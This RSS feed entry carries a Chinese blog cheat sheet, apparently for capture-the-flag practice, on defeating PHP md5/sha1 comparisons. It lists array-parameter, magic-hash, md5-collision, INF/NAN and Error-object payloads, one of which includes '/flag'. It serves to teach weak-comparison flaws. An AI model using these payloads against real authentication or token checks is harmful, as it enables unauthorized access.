<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>md5 on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/md5/</link><description>Recent content in md5 on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 03 Dec 2021 00:24:56 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/md5/index.xml" rel="self" type="application/rss+xml"/><item><title>md5比较常见绕过小结</title><link>https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/</link><pubDate>Fri, 03 Dec 2021 00:24:56 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/</guid><description>&lt;blockquote>
&lt;p>&lt;strong>&lt;u>写在开头：&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>别纠结&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>左侧的符号反转&amp;amp;标题是中文引号&amp;amp;有些符号消失&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>的问题&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>我也很无语&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>寄。&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;ul>
&lt;li>
&lt;pre tabindex="0">&lt;code>md5(array()) = md5(NULL) = d41d8cd98f00b204e9800998ecf8427e
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>sha1绕过和md5绕过方式是一样的&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="md5amd5b--ab">md5($a)==md5($b) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;p>0e绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>IHKFRNS -&amp;gt; 0e256160682445802696926137988570
QLTHNDT -&amp;gt; 0e405967825401955372549139051580
QNKCDZO -&amp;gt; 0e830400451993494058024219903391
3908336290 -&amp;gt; 0e807624498959190415881248245271
4011627063 -&amp;gt; 0e485805687034439905938362701775
4775635065 -&amp;gt; 0e998212089946640967599450361168
0e215962017 -&amp;gt; 0e291242476940776845150308577824
aabg7XSs -&amp;gt; 0e087386482136013740957780965295
aabC9RqS -&amp;gt; 0e041022518165728065344349536299
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>0e251288019 -&amp;gt; 0e874956163641961271069404332409
240610708 -&amp;gt; 0e462097431906509019562988736854
&lt;/code>&lt;/pre>&lt;p>md5碰撞&lt;/p>
&lt;pre tabindex="0">&lt;code>a=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP
b=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5md5b--ab">md5($a)==md5(md5($b)) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>a=&amp;amp;b[]=1
&lt;/code>&lt;/pre>&lt;h2 id="md5string_getamd5md5string_getb--ab">md5((string)$_GET[&amp;lsquo;a&amp;rsquo;])==md5(md5((string)$_GET[&amp;lsquo;b&amp;rsquo;])) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>0e绕过，一个是正常0e，一个是第二次md5后还为0e的奇葩值&lt;/p>
&lt;pre tabindex="0">&lt;code>aawBzC
aabsbm9
aaaabGG5T
aaaabKGVH
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b--ctype_alphaa--is_numericb">md5($a)==md5($b) &amp;amp;&amp;amp; !ctype_alpha($a) &amp;amp;&amp;amp; !is_numeric($b)&lt;/h2>
&lt;p>0e绕过，一个纯数字一个纯字母&lt;/p>
&lt;pre tabindex="0">&lt;code>240610708 -&amp;gt; 0e462097431906509019562988736854
QNKCDZO -&amp;gt; 0e830400451993494058024219903391
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b----ab">md5($a)===md5($b) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5md5b--ab-1">md5($a)===md5(md5($b)) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b----ab-1">md5($a)===md5($b) &amp;amp;&amp;amp; $a!==$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="ahashmd4a">$a!=hash(&amp;ldquo;md4&amp;rdquo;,$a)&lt;/h2>
&lt;p>0e纯数字绕过&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;0e&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$md4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">hash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/^0e[0-9]*$/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$md4&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4加密前:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4加密后：&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$md4&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>0e251288019 -&amp;gt; 0e874956163641961271069404332409
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b--ab--strlena3--strlenb3">md5($a)===md5($b) &amp;amp;&amp;amp; $a!==$b &amp;amp;&amp;amp; strlen($a)&amp;lt;=3 &amp;amp;&amp;amp; strlen($b)&amp;lt;=3&lt;/h2>
&lt;p>INF表示无穷大，而NAN表示一个在浮点数运算中未定义或不可表述的值；除了与True之外，拿NAN与其他任何值进行松散比较或者严格比较返回结果都是FALSE
因为他们都是不确定的值，所以在与自身做比较时，会返回false&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030175015724.png" alt="image-20211030175015724">&lt;/p>
&lt;p>INF和NAN绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>a=INF&amp;amp;b=INF
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>a=NAN&amp;amp;b=NAN
&lt;/code>&lt;/pre>&lt;h2 id="this-syc--this-lover--md5this-syc--md5this-lover--sha1this-syc-sha1this-lover">($this-&amp;gt;syc != $this-&amp;gt;lover) &amp;amp;&amp;amp; (md5($this-&amp;gt;syc) === md5($this-&amp;gt;lover)) &amp;amp;&amp;amp; (sha1($this-&amp;gt;syc)=== sha1($this-&amp;gt;lover))&lt;/h2>
&lt;p>做题遇到的&lt;/p>
&lt;p>用原生类&lt;code>Error&lt;/code>（php7）或&lt;code>Exception&lt;/code>（php5 or 7），它有&lt;code>__toString&lt;/code>方法，被触发后会以字符串形式输出当前保存情况，包括错误信息和当前报错的行号，而跟传入的参数没有关系；所以说可以构造两个类的实例，它们行号相同（被&lt;code>__toString&lt;/code>调用后输出信息一样），但是本身不相同（传入参数不等）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;lt;?=include~&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 这个不重要 是那个题的payload
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SYCLOVER&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意$a和$b写到一行&lt;/p>
&lt;h2 id="this-token--this-token_flag">$this-&amp;gt;token === $this-&amp;gt;token_flag&lt;/h2>
&lt;p>指针取地址绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>$F-&amp;gt;token=&amp;amp;$F-&amp;gt;token_flag;
&lt;/code>&lt;/pre></description></item></channel></rss>